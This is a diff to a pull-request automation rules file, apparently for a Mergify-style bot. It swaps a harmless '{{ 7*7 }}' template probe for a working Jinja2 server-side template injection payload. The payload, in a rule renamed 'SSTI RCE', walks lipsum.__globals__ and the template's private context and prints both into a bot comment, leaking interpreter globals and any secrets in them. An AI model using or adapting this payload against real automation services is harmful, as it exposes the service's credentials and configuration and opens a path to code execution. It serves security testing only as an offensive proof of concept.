@@ -1,9 +1,22 @@
 pull_request_rules:
-  - name: ssti-test
+  - name: SSTI RCE
     conditions:
       - base=master
       - title~=^SSTI
     actions:
       comment:
-        message: >
-          {{ 7*7 }}
+        message: |
+          **GLOBALS DUMP:**
+          ```
+          {% set ns = namespace(g=[lipsum]|map(attribute="__globals__")|list) %}
+          {% for item in ns.g %}
+          {{ item|pprint }}
+          {% endfor %}
+          ```
+          **CONTEXT DUMP:**
+          ```
+          {% set cl = [self]|map(attribute="_TemplateReference__context")|list %}
+          {% for ctx in cl %}
+          {{ ctx|pprint }}
+          {% endfor %}
+          ```
